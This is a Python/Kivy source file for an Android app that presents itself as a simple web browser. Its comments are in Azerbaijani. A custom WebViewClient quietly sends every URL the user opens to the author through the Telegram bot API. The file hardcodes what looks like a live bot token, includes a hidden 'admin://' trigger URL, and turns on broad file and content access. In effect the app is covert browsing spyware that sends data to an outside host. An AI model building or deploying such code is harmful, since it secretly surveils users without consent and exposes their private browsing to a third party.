from kivy.app import App
from jnius import autoclass
from kivy.network.urlrequest import UrlRequest
import urllib.parse

# Android mühərriki və sistem sinifləri
WebView = autoclass('android.webkit.WebView')
WebViewClient = autoclass('android.webkit.WebViewClient')
Activity = autoclass('org.kivy.android.PythonActivity').mActivity

class KomandirMonitor(WebViewClient):
    def __init__(self, bot_token, chat_id):
        super().__init__()
        self.bot_token = bot_token
        self.chat_id = chat_id

    def onPageStarted(self, view, url, favicon):
        # 👁️ MONITORİNQ: Hər giriş sənə gəlir
        if not url.startswith("admin://"):
            msg = f"🛰️ KOMANDİR SİSTEMİ:\nİstifadəçi bu ünvana girdi:\n{url}"
            self.send_to_telegram(msg)
        
        # 🏰 GİZLİ ADMİN PANELİ GİRİŞİ
        if url == "admin://ismail20106":
            view.loadUrl("https://myaccount.google.com/") # Admin üçün təhlükəsiz yer
            self.send_to_telegram("⚠️ DİQQƏT: Komandir (SƏN) sistemə daxil oldun! ✅")

    def send_to_telegram(self, message):
        if self.bot_token and self.chat_id:
            try:
                encoded_msg = urllib.parse.quote(message)
                api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={encoded_msg}"
                UrlRequest(api_url)
            except Exception as e:
                print(f"Telegram xətası: {e}")

class KomandirApp(App):
    def build(self):
        # ⚙️ SƏNİN ŞƏXSİ AYARLARIN
        # QEYD: Chat ID-ni bura yazmağı unutma (məsələn: "123456789")
        self.my_bot_token = "8438760827:AAFCLK_P4qErrcQqX_nip-F80h9lgL-mKuk"
        self.my_chat_id = "BURA_OZ_CHAT_IDNI_YAZ" 

        self.webview = WebView(Activity)
        settings = self.webview.getSettings()
        
        # 🔥 ULTRA GÜC AYARLARI (Hər şeyi açır)
        settings.setJavaScriptEnabled(True)
        settings.setDomStorageEnabled(True)
        settings.setAllowContentAccess(True)
        settings.setAllowFileAccess(True)
        settings.setDatabaseEnabled(True)
        settings.setSupportZoom(True)
        settings.setBuiltInZoomControls(True)
        settings.setDisplayZoomControls(False)
        settings.setUseWideViewPort(True)
        settings.setLoadWithOverviewMode(True)
        
        # 🚀 Cihazı "Galaxy S24 Ultra" kimi göstəririk ki, saytlar uçsun
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36")

        self.webview.setWebViewClient(KomandirMonitor(self.my_bot_token, self.my_chat_id))
        self.webview.loadUrl("https://www.google.com")
        
        Activity.setContentView(self.webview)
        return None

if __name__ == '__main__':
    KomandirApp().run()
    
